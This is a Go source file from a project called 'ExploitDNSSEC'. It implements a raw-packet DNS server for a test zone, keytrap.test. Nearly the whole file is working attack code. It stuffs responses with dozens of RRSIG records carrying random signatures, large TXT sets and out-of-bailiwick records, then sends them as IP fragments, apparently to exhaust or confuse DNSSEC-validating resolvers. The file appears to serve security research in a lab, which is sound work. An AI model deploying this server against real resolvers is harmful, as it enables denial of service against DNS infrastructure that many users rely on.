/**
 * @Project :   ExploitDNSSEC
 * @File    :   ANYTHING.go
 * @Contact :	tochus@163.com
 * @License :   (C)Copyright 2024
 * @Description: A DNS server that sends ANYTHING with RRSIG in the additional section.
 * @Modify Time        @Author     @Version    @Description
 * ----------------    --------    --------    -----------
 * 4/8/23 5:34 PM      idealeer    0.0         None
 * 14/10/24 16:28	   4stra       0.1.0       Enable DNSSEC
 * 15/10/24 11:10      4stra       0.2.0       Ethnet Fragmentation
 * 15/10/24 19:49      4stra       0.3.0       Large TXT RRSET
 * 16/10/24 10:25 	   4stra       0.4.0       Out-of-bailiwick TXT records within AR
 * 17/10/24 15:33	   4stra       0.5.0	   Send ANYTHING with RRSIG in the additional section
 */
package main

import (
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"time"

	// 微调的gopacket库
	"github.com/tochusc/gopacket"
	"github.com/tochusc/gopacket/layers"
	"github.com/tochusc/gopacket/pcap"
)

var randomSigNumC = 10
var rrsigSignatureByteLenC = 96
var nsIPv4C = "10.10.3.3"
var nsIPv6C = "2001:db8::3"

var authrotiySection = func() []layers.DNSResourceRecord {
	authority := make([]layers.DNSResourceRecord, 0)
	authority = append(
		authority,
		layers.DNSResourceRecord{
			Name:  []byte("keytrap.test"),
			Type:  layers.DNSTypeNS,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			NS:    []byte(fmt.Sprintf("ns1.keytrap.test")),
		},
	)
	authority = append(authority,
		layers.DNSResourceRecord{
			Name:       []byte("keytrap.test"),
			Type:       layers.DNSTypeRRSIG,
			Class:      layers.DNSClassIN,
			TTL:        uint32(globalTTLC),
			DataLength: rrsig["keytrap.test"].Len(),
			Data:       rrsig["keytrap.test"].Serialize(),
		},
	)
	return authority
}()

var additionalSection = func() []layers.DNSResourceRecord {
	additional := make([]layers.DNSResourceRecord, 0)
	additional = append(
		additional,
		layers.DNSResourceRecord{
			Name:  []byte("txt.keytrap.test"),
			Type:  layers.DNSTypeTXT,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			TXTs:  [][]byte{[]byte("This is a TXT record")},
		},
		genRandomRRSIGRR("txt.keytrap.test", layers.DNSTypeTXT),

		layers.DNSResourceRecord{
			Name:  []byte("ns.keytrap.test"),
			Type:  layers.DNSTypeNS,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			NS:    []byte(fmt.Sprintf("ns1.ns.keytrap.test")),
		},
		genRandomRRSIGRR("ns.keytrap.test", layers.DNSTypeNS),

		layers.DNSResourceRecord{
			Name:  []byte("cname.keytrap.test"),
			Type:  layers.DNSTypeCNAME,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			CNAME: []byte("cname0.keytrap.test"),
		},
		genRandomRRSIGRR("cname.keytrap.test", layers.DNSTypeCNAME),

		layers.DNSResourceRecord{
			Name:  []byte("ptr.keytrap.test"),
			Type:  layers.DNSTypePTR,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			PTR:   []byte("ptr0.keytrap.test"),
		},
		genRandomRRSIGRR("ptr.keytrap.test", layers.DNSTypePTR),

		layers.DNSResourceRecord{
			Name:  []byte("mx.keytrap.test"),
			Type:  layers.DNSTypeMX,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			MX: layers.DNSMX{
				Preference: 10,
				Name:       []byte("mx0.keytrap.test"),
			},
		},
		genRandomRRSIGRR("mx.keytrap.test", layers.DNSTypeMX),

		layers.DNSResourceRecord{
			Name:  []byte("soa.keytrap.test"),
			Type:  layers.DNSTypeSOA,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			SOA: layers.DNSSOA{
				MName:   []byte("mname.keytrap.test"),
				RName:   []byte("rname.keytrap.test"),
				Serial:  1,
				Refresh: 2,
				Retry:   3,
				Expire:  4,
				Minimum: 5,
			},
		},
		genRandomRRSIGRR("soa.keytrap.test", layers.DNSTypeSOA),

		layers.DNSResourceRecord{
			Name:  []byte("aaaa.keytrap.test"),
			Type:  layers.DNSTypeAAAA,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			IP:    net.ParseIP(nsIPv6C),
		},
		genRandomRRSIGRR("aaaa.keytrap.test", layers.DNSTypeAAAA),

		layers.DNSResourceRecord{
			Name:  []byte("a.keytrap.test"),
			Type:  layers.DNSTypeA,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			IP:    net.ParseIP(nsIPv4C),
		},
		genRandomRRSIGRR("a.keytrap.test", layers.DNSTypeA),

		layers.DNSResourceRecord{
			Name:  []byte("srv.keytrap.test"),
			Type:  layers.DNSTypeSRV,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			SRV: layers.DNSSRV{
				Priority: 10,
				Weight:   20,
				Port:     30,
				Name:     []byte("srv0.keytrap.test"),
			},
		},
		genRandomRRSIGRR("srv.keytrap.test", layers.DNSTypeSRV),

		layers.DNSResourceRecord{
			Name:  []byte("uri.keytrap.test"),
			Type:  layers.DNSTypeURI,
			Class: layers.DNSClassIN,
			TTL:   uint32(globalTTLC),
			URI: layers.DNSURI{
				Priority: 10,
				Weight:   20,
				Target:   []byte("uri0.keytrap.test"),
			},
		},
		genRandomRRSIGRR("uri.keytrap.test", layers.DNSTypeURI),
	)

	// TXT records
	additional = append(additional, genLotsOfRandomRRSIGRR("txt.keytrap.test", layers.DNSTypeTXT, randomSigNumC)...)
	// SOA records
	additional = append(additional, genLotsOfRandomRRSIGRR("soa.keytrap.test", layers.DNSTypeSOA, randomSigNumC)...)
	// PTR records
	additional = append(additional, genLotsOfRandomRRSIGRR("ptr.keytrap.test", layers.DNSTypePTR, randomSigNumC)...)
	// MX records
	additional = append(additional, genLotsOfRandomRRSIGRR("mx.keytrap.test", layers.DNSTypeMX, randomSigNumC)...)
	//	SRV records
	additional = append(additional, genLotsOfRandomRRSIGRR("srv.keytrap.test", layers.DNSTypeSRV, randomSigNumC)...)
	//	URI records
	additional = append(additional, genLotsOfRandomRRSIGRR("uri.keytrap.test", layers.DNSTypeURI, randomSigNumC)...)

	// Crowed the additional section with TXT records
	for i := 0; i < 16; i++ {
		additional = append(
			additional,
			layers.DNSResourceRecord{
				Name:  []byte(fmt.Sprintf("txt%d.keytrap.test", i)),
				Type:  layers.DNSTypeTXT,
				Class: layers.DNSClassIN,
				TTL:   uint32(globalTTLC),
				TXTs:  [][]byte{[]byte(fmt.Sprintf("This is a TXT record %d", i))},
			},
		)
		additional = append(additional, genLotsOfRandomRRSIGRR(fmt.Sprintf("txt%d.keytrap.test", i), layers.DNSTypeTXT, randomSigNumC)...)
	}
	return additional
}()

func genLotsOfRandomRRSIGRR(name string, rtype layers.DNSType, num int) []layers.DNSResourceRecord {
	rrsigs := make([]layers.DNSResourceRecord, 0)
	for i := 0; i < num; i++ {
		rrsigs = append(rrsigs, genRandomRRSIGRR(name, rtype))
	}
	return rrsigs
}

func genRandomRRSIGRR(name string, rtype layers.DNSType) layers.DNSResourceRecord {
	labelNum := strings.Count(name, ".") + 1
	return layers.DNSResourceRecord{
		Name:       []byte(name),
		Type:       layers.DNSTypeRRSIG,
		Class:      layers.DNSClassIN,
		TTL:        uint32(globalTTLC),
		DataLength: genBaseRRSIG(int(rtype), labelNum).Len() + uint16(rrsigSignatureByteLenC),
		Data:       append(genBaseRRSIG(int(rtype), labelNum).Serialize(), genRandomByte(rrsigSignatureByteLenC)...),
	}
}

func genBaseRRSIG(typeCovered, labelNum int) *RRSIG {
	return &RRSIG{
		TypeCovered: uint16(typeCovered),
		Algorithm:   14,
		Labels:      uint8(labelNum),
		OriginalTTL: globalTTL,
		Expiration:  expiration,
		Inception:   inception,
		KeyTag:      zskKeyTag,
		SignerName:  signerName,
	}
}

func genRandomByte(byteLen int) []byte {
	b := make([]byte, byteLen)
	_, err := rand.Read(b)
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}
	return b
}

// DNS服务器配置相关变量
var (
	serverIPC = "10.10.3.3"
	srcPortC  = 53
	deviceC   = "eth0"

	// 以太网最大传输单元：发送方所能接受的最大载荷大小
	mtuC = 1500
	// 以太网帧最大长度：mtuC + ethHeaderLenC = 1514字节
	ethHeaderLenC = 14
	ipHeaderLenC  = 20

	serverMACC  = net.HardwareAddr{0x02, 0x42, 0x0a, 0x0a, 0x03, 0x03}
	handleSend  *pcap.Handle
	err         error
	domainNameC = []string{"www.keytrap.test", "keytrap.test", "ns1.keytrap.test"}
)

// DNSSEC验证相关变量（每次签名都需修改其中值）
var (
	globalTTLC = 86400

	expirationC = "20241112125051"
	inceptionC  = "20241013125051"

	zskKeyTagC = 6350
	kskKeyTagC = 30130

	// algorithmC = 14

	signerNameC = "keytrap.test."
	signaturesC = map[string]string{
		"www.keytrap.test.": "YsPPs2WpuC0h7+eYanDr3NZ+boDSkUAUHjhKVGzMlHpkpyjTMpJYsHk/M9Hm2isq5loXKpCS43ILkb/9+kBUpyjS+kMQwN+V7v+4fPECpaA+B+sh1S0E2zT0l24JBbBw",
		"keytrap.test.":     "2g+7jwHGSajuBtOYYM1O+/AC64CdwRaM4lNUryxYdz+Vn/ZqUL/Rxp/RHEFja5a+SwDzME6VwzY47BFLpoQC04afzaxwKSTpn1mw2tRxS+ZLvI/s0XhRLLGbVk0vf9pb",
		"ns1.keytrap.test.": "efiWRospV7iPUMpT6T81FbZ2x10HvEbgS+L/8TvINibNZfi0OLaVm/AQ//tCQjx86Aak8lg2IGH9EmqaeQwdgVG34bLdWbcsin+JvuXOPrB5K5hePxX59LS0svFMWy8P",
		"ZSK":               "1T2zwLEXVvY8ZAKRCKxYGp6jiaAK9/es6nSQbOBS5vgVLaBi/8UX5hVjdBpgmGxJqPVYzwl20L04fPDtAIMAcRXCpzb8NfznEYFRfBIMA53fBHs5IYQGUPBGrH5nPMGr",
		"KSK":               "tYfcl8gWb1OqrPUGoM34X5u0jX6/DxKajsQLXAECLruClEwF/QzSW37JEIAuGvGgkmJNejinukrG+Z6buAl0bFkCfEbyUT+NEcr3a3TrY+0HEXyPxdKyQIHXNiQZLD/6",
	}
	dnskeyC = map[string]string{
		"ZSK": "DcYreAh+USsK1mtv7bSR2iaQvShPUqCy7l/BRQXttAFupXp6pUaQZS+kii+H2JJqd+rS4YgC3KCd/by8yQi5j+WSy2yRprSuFuDyqZMFnDT/Py+nGjmIa59+W1iMdEYb",
		"KSK": "MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hlhZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zhtL4aGaOG+870yHwuY",
	}
)

func decode(s string) []byte {
	data, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		fmt.Println("Error decoding base64:", err)
		return nil
	}
	return data
}

func encodeDomainName(signerName string) []byte {
	byteArray := make([]byte, 0)
	labelsArray := strings.Split(signerName, ".")
	for _, label := range labelsArray {
		labelLength := byte(len(label))
		byteArray = append(byteArray, labelLength)
		byteArray = append(byteArray, []byte(label)...)
	}
	return byteArray
}

var (
	globalTTL = uint32(globalTTLC)

	expirationTimestamp, _ = time.Parse("20060102150405", expirationC)
	expiration             = uint32(expirationTimestamp.UTC().Unix())

	inceptionTimestamp, _ = time.Parse("20060102150405", inceptionC)
	inception             = uint32(inceptionTimestamp.UTC().Unix())

	zskKeyTag = uint16(zskKeyTagC)
	kskKeyTag = uint16(kskKeyTagC)

	signerName = encodeDomainName(signerNameC)
	signatures = map[string][]byte{
		"www.keytrap.test.": decode(signaturesC["www.keytrap.test."]),
		"keytrap.test.":     decode(signaturesC["keytrap.test."]),
		"ns1.keytrap.test.": decode(signaturesC["ns1.keytrap.test."]),
		"ZSK":               decode(signaturesC["ZSK"]),
		"KSK":               decode(signaturesC["KSK"]),
	}
	dnskey = map[string][]byte{
		"ZSK": decode(dnskeyC["ZSK"]),
		"KSK": decode(dnskeyC["KSK"]),
	}
)

var rrsig = map[string]*RRSIG{
	"www.keytrap.test": {
		TypeCovered: uint16(layers.DNSTypeA),
		Algorithm:   14,
		Labels:      3,
		OriginalTTL: globalTTL,
		Expiration:  expiration,
		Inception:   inception,
		KeyTag:      zskKeyTag,
		SignerName:  signerName,
		Signature:   signatures["www.keytrap.test."],
	},
	"keytrap.test": {
		TypeCovered: uint16(layers.DNSTypeNS),
		Algorithm:   14,
		Labels:      2,
		OriginalTTL: globalTTL,
		Expiration:  expiration,
		Inception:   inception,
		KeyTag:      zskKeyTag,
		SignerName:  signerName,
		Signature:   signatures["keytrap.test."],
	},
	"ns1.keytrap.test": {
		TypeCovered: uint16(layers.DNSTypeA),
		Algorithm:   14,
		Labels:      3,
		OriginalTTL: globalTTL,
		Expiration:  expiration,
		Inception:   inception,
		KeyTag:      zskKeyTag,
		SignerName:  signerName,
		Signature:   signatures["ns1.keytrap.test."],
	},
	"ZSK": {
		TypeCovered: uint16(layers.DNSTypeDNSKEY),
		Algorithm:   14,
		Labels:      2,
		OriginalTTL: globalTTL,
		Expiration:  expiration,
		Inception:   inception,
		KeyTag:      zskKeyTag,
		SignerName:  signerName,
		Signature:   signatures["ZSK"],
	},
	"KSK": {
		TypeCovered: uint16(layers.DNSTypeDNSKEY),
		Algorithm:   14,
		Labels:      2,
		OriginalTTL: globalTTL,
		Expiration:  expiration,
		Inception:   inception,
		KeyTag:      kskKeyTag,
		SignerName:  signerName,
		Signature:   signatures["KSK"],
	},
}

var dnskeys = map[string]*DNSKEY{
	"ZSK": {
		Flags:     256,
		Protocol:  3,
		Algorithm: 14,
		PublicKey: dnskey["ZSK"],
	},
	"KSK": {
		Flags:     257,
		Protocol:  3,
		Algorithm: 14,
		PublicKey: dnskey["KSK"],
	},
}

// RRSIG RR 结构体
type RRSIG struct {
	TypeCovered uint16
	Algorithm   uint8
	Labels      uint8
	OriginalTTL uint32
	Expiration  uint32
	Inception   uint32
	KeyTag      uint16
	SignerName  []byte
	Signature   []byte
}

// RRSIG的序列化方法
func (rrsig *RRSIG) Serialize() []byte {
	b := make([]byte, 0)
	b = append(b, byte(rrsig.TypeCovered>>8), byte(rrsig.TypeCovered))
	b = append(b, rrsig.Algorithm)
	b = append(b, rrsig.Labels)
	b = append(b, byte(rrsig.OriginalTTL>>24), byte(rrsig.OriginalTTL>>16), byte(rrsig.OriginalTTL>>8), byte(rrsig.OriginalTTL))
	b = append(b, byte(rrsig.Expiration>>24), byte(rrsig.Expiration>>16), byte(rrsig.Expiration>>8), byte(rrsig.Expiration))
	b = append(b, byte(rrsig.Inception>>24), byte(rrsig.Inception>>16), byte(rrsig.Inception>>8), byte(rrsig.Inception))
	b = append(b, byte(rrsig.KeyTag>>8), byte(rrsig.KeyTag))
	b = append(b, rrsig.SignerName...)
	b = append(b, rrsig.Signature...)
	return b
}

// RRSIG的长度方法
func (rrsig *RRSIG) Len() uint16 {
	return uint16(18 + len(rrsig.SignerName) + len(rrsig.Signature))
}

type DNSKEY struct {
	Flags     uint16
	Protocol  uint8
	Algorithm uint8
	PublicKey []byte
}

// DNSKEY的序列化方法
func (dnskey *DNSKEY) Serialize() []byte {
	b := make([]byte, 0)
	b = append(b, byte(dnskey.Flags>>8), byte(dnskey.Flags))
	b = append(b, dnskey.Protocol)
	b = append(b, dnskey.Algorithm)
	b = append(b, dnskey.PublicKey...)
	return b
}

// DNSKEY的长度方法
func (dnskey *DNSKEY) Len() uint16 {
	return uint16(4 + len(dnskey.PublicKey))
}

// DNSSEC RR 接口
type DNSSECRR interface {
	Serialize() []byte
	Len() uint16
}

// dnsResponseC响应DNS请求，生成DNS回复并发送。
func dnsResponseC(dstMAC net.HardwareAddr, dstIP string, dstPort layers.UDPPort, qname string, qtype layers.DNSType, txid uint16) {
	fmt.Printf("%s : fm %s query %s %s\n", time.Now().Format(time.ANSIC), dstIP, qname, qtype.String())

	// Generate a random IPID value for all fragments
	ipID := uint16(rand.Intn(65536)) // Generate a random number between 0 and 65535

	ethernetLayer := &layers.Ethernet{
		BaseLayer:    layers.BaseLayer{},
		SrcMAC:       serverMACC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
		Length:       0,
	}

	ipv4Layer := &layers.IPv4{
		BaseLayer:  layers.BaseLayer{},
		Version:    4,
		IHL:        0,
		TOS:        0,
		Length:     0,
		Id:         ipID,
		Flags:      0,
		FragOffset: 0,
		TTL:        64,
		Protocol:   layers.IPProtocolUDP,
		Checksum:   0,
		SrcIP:      net.ParseIP(serverIPC),
		DstIP:      net.ParseIP(dstIP),
		Options:    nil,
		Padding:    nil,
	}

	udpLayer := &layers.UDP{
		BaseLayer: layers.BaseLayer{},
		SrcPort:   layers.UDPPort(srcPortC),
		DstPort:   layers.UDPPort(dstPort),
		Length:    0,
		Checksum:  0,
	}

	err := udpLayer.SetNetworkLayerForChecksum(ipv4Layer)
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}

	var dnsLayer *layers.DNS
	switch qtype {
	case layers.DNSTypeA:
		if _, ok := rrsig[qname]; !ok {
			// 未配置的域名，返回NXDOMAIN
			dnsLayer = &layers.DNS{
				BaseLayer:    layers.BaseLayer{},
				ID:           txid,
				QR:           true,
				OpCode:       0,
				AA:           true,
				TC:           false,
				RD:           false,
				RA:           false,
				Z:            0,
				ResponseCode: 3, // NXDOMAIN
				QDCount:      1,
				Questions: []layers.DNSQuestion{
					{
						Name:  []byte(qname),
						Type:  layers.DNSTypeA,
						Class: layers.DNSClassIN,
					},
				},
			}
		} else {
			dnsLayer = &layers.DNS{
				BaseLayer:    layers.BaseLayer{},
				ID:           txid,
				QR:           true,
				OpCode:       0,
				AA:           true,
				TC:           false,
				RD:           false,
				RA:           false,
				Z:            0,
				ResponseCode: 0,
				QDCount:      1,
				ANCount:      2,
				NSCount:      uint16(len(authrotiySection)),
				ARCount:      uint16(len(additionalSection)),
				Questions: []layers.DNSQuestion{
					{
						Name:  []byte(qname),
						Type:  layers.DNSTypeA,
						Class: layers.DNSClassIN,
					},
				},
				Answers: []layers.DNSResourceRecord{
					{
						Name:  []byte(qname),
						Type:  layers.DNSTypeA,
						Class: layers.DNSClassIN,
						TTL:   uint32(globalTTLC),
						IP:    net.ParseIP(serverIPC),
					},
					// RRSIG
					{
						Name:       []byte(qname),
						Type:       layers.DNSTypeRRSIG,
						Class:      layers.DNSClassIN,
						TTL:        uint32(globalTTLC),
						DataLength: rrsig[qname].Len(),
						Data:       rrsig[qname].Serialize(),
					},
				},
				Authorities: authrotiySection,
				Additionals: additionalSection,
			}
		}
	case layers.DNSTypeDNSKEY:
		dnsLayer = &layers.DNS{
			BaseLayer:    layers.BaseLayer{},
			ID:           txid,
			QR:           true,
			OpCode:       0,
			AA:           true,
			TC:           false,
			RD:           false,
			RA:           false,
			Z:            0,
			ResponseCode: 0,
			QDCount:      1,
			ANCount:      4,
			NSCount:      0,
			ARCount:      0,
			Questions: []layers.DNSQuestion{
				{
					Name:  []byte(qname),
					Type:  layers.DNSTypeDNSKEY,
					Class: layers.DNSClassIN,
				},
			},
			Answers: []layers.DNSResourceRecord{
				// DNSKEY
				{
					Name:       []byte(qname),
					Type:       layers.DNSTypeDNSKEY,
					Class:      layers.DNSClassIN,
					TTL:        globalTTL,
					DataLength: dnskeys["KSK"].Len(),
					Data:       dnskeys["KSK"].Serialize(),
				},
				{
					Name:       []byte(qname),
					Type:       layers.DNSTypeDNSKEY,
					Class:      layers.DNSClassIN,
					TTL:        globalTTL,
					DataLength: dnskeys["ZSK"].Len(),
					Data:       dnskeys["ZSK"].Serialize(),
				},
				// RRSIG
				{
					Name:       []byte(qname),
					Type:       layers.DNSTypeRRSIG,
					Class:      layers.DNSClassIN,
					TTL:        globalTTL,
					DataLength: rrsig["ZSK"].Len(),
					Data:       rrsig["ZSK"].Serialize(),
				},
				{
					Name:       []byte(qname),
					Type:       layers.DNSTypeRRSIG,
					Class:      layers.DNSClassIN,
					TTL:        globalTTL,
					DataLength: rrsig["KSK"].Len(),
					Data:       rrsig["KSK"].Serialize(),
				},
			},
		}
	default:
		// 未知查询类型，返回NXDOMAIN
		dnsLayer = &layers.DNS{
			BaseLayer:    layers.BaseLayer{},
			ID:           txid,
			QR:           true,
			OpCode:       0,
			AA:           true,
			TC:           false,
			RD:           false,
			RA:           false,
			Z:            0,
			ResponseCode: 3, // NXDOMAIN
			QDCount:      1,
			Questions: []layers.DNSQuestion{
				{
					Name:  []byte(qname),
					Type:  qtype,
					Class: layers.DNSClassIN,
				},
			},
		}
	}

	// DNS层序列化
	dnsBuffer := gopacket.NewSerializeBuffer()
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}
	err = dnsLayer.SerializeTo(dnsBuffer, options)
	if err != nil {
		fmt.Println("DNS Layer Serialzing Error: ", err)
		os.Exit(1)
	}
	dnsPayload := dnsBuffer.Bytes()
	fmt.Printf(
		"%s : DNS layer size = %d\n", time.Now().Format(time.ANSIC), len(dnsPayload),
	)

	// UDP层序列化
	udpBuffer := gopacket.NewSerializeBuffer()
	err = gopacket.SerializeLayers(
		udpBuffer,
		options,
		udpLayer,
		gopacket.Payload(dnsPayload),
	)
	if err != nil {
		fmt.Println("UDP Layer Serialzing Error: ", err)
		os.Exit(1)
	}
	udpPayload := udpBuffer.Bytes()
	fmt.Printf(
		"%s : UDP layer size = %d\n", time.Now().Format(time.ANSIC), len(udpPayload),
	)

	// 计算每个分片的载荷大小：MTU - IP头部长度
	payloadSize := mtuC - ipHeaderLenC
	// 确保每个分片的载荷大小是8的倍数
	payloadSize = payloadSize &^ 7

	// 分片
	fragments := make([][]byte, 0)
	for i := 0; i < len(udpPayload); i += payloadSize {
		end := i + payloadSize
		if end > len(udpPayload) {
			end = len(udpPayload)
		}
		fragments = append(fragments, udpPayload[i:end])
	}

	// 发送分片
	for i, fragment := range fragments {
		// 设置IP层长度
		ipv4Layer.Length = uint16(ipHeaderLenC + len(fragment))

		// 设置IP层标志
		if i == len(fragments)-1 {
			ipv4Layer.Flags = 0
		} else {
			ipv4Layer.Flags = layers.IPv4MoreFragments
		}

		// 计算偏移量
		ipv4Layer.FragOffset = uint16(i * payloadSize / 8)

		// IP层序列化
		ipv4Buffer := gopacket.NewSerializeBuffer()
		err = gopacket.SerializeLayers(
			ipv4Buffer,
			options,
			ipv4Layer,
			gopacket.Payload(fragment),
		)
		if err != nil {
			fmt.Println("IPv4 Layer Serialzing Error: ", err)
			os.Exit(1)
		}
		ipv4Payload := ipv4Buffer.Bytes()

		// 以太网层序列化
		ethernetBuffer := gopacket.NewSerializeBuffer()
		err = gopacket.SerializeLayers(
			ethernetBuffer,
			options,
			ethernetLayer,
			gopacket.Payload(ipv4Payload),
		)
		if err != nil {
			fmt.Println("Ethernet Layer Serialzing Error: ", err)
			os.Exit(1)
		}

		// 发送数据包
		outgoingPacket := ethernetBuffer.Bytes()
		err = handleSend.WritePacketData(outgoingPacket)
		if err != nil {
			fmt.Println("Error sending packet: ", err)
			os.Exit(1)
		}

		fmt.Printf(
			"%s : frag#%d with size %d\n", time.Now().Format(time.ANSIC), i+1, len(fragment),
		)
	}

	fmt.Printf(
		"%s : to %s with %s %s %d\n", time.Now().Format(time.ANSIC), dstIP, qname,
		qtype.String(), globalTTLC,
	)
}

func main() {
	fmt.Printf("%s : %s\n", time.Now().Format(time.ANSIC), "DNS server starts")

	handleSend, err = pcap.OpenLive(deviceC, 1024, false, 0*time.Second)
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}
	defer handleSend.Close()

	handleRecv, err := pcap.OpenLive(deviceC, 1024, false, time.Nanosecond)
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}
	defer handleRecv.Close()

	// 设置过滤器
	var filter = fmt.Sprintf("ip and udp dst port %d", srcPortC)
	err = handleRecv.SetBPFFilter(filter)
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}

	// 设置Handler为接收方向
	err = handleRecv.SetDirection(pcap.DirectionIn)
	if err != nil {
		fmt.Println("Error: ", err)
		os.Exit(1)
	}

	//	设置解析器
	var eth layers.Ethernet
	var ipv4 layers.IPv4
	var udp layers.UDP
	var dns_ layers.DNS
	var decoded []gopacket.LayerType
	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth, &ipv4, &udp, &dns_)
	//	设置数据包源
	packetSource := gopacket.NewPacketSource(handleRecv, handleRecv.LinkType())
	packetChan := packetSource.Packets()
	//	接收数据包并解析
	for packet := range packetChan {
		if err := parser.DecodeLayers(packet.Data(), &decoded); err != nil {
			continue
		}

		if len(dns_.Questions) <= 0 {
			continue
		}

		dstMAC := eth.SrcMAC
		dstIP := ipv4.SrcIP.String()
		dstPort := udp.SrcPort
		qname := string(dns_.Questions[0].Name)
		qtype := dns_.Questions[0].Type
		txid := dns_.ID

		go dnsResponseC(dstMAC, dstIP, dstPort, qname, qtype, txid)
	}
}
